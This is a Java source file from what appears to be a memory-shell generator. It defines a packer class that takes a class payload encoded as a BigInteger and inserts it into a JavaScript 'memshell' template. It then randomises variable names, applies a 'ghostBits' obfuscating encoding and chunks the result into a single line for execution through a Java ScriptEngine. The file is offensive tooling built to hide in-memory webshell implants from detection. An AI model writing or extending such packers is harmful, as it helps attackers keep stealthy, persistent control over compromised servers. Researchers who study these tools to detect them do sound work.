package org.leo.jmg.mem.packer.scriptengine;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.Util;

import java.util.Collections;

import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scriptToSingleLine;

@PackerMeta(name = "ScriptEngineBigInteger", group = "ScriptEngine", order = 3)
public class ScriptEngineBigIntegerPacker implements Packer {
    private final String jsTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngineBigInteger.js");

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String bigIntegerStr = PackerRegistry.getOrThrow("BigInteger").pack(config);
        // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
        // bigIntegerStr 作为额外占位符传入（不经过 chunkPayload，base36 字符集已覆盖）
        String script = TemplateRenderer.render(jsTemplate, config,
                Collections.singletonMap("bigIntegerStr", bigIntegerStr));
        return scriptToSingleLine(Util.chunkPayload(Util.ghostBitsEncodeJs(script)));
    }
}
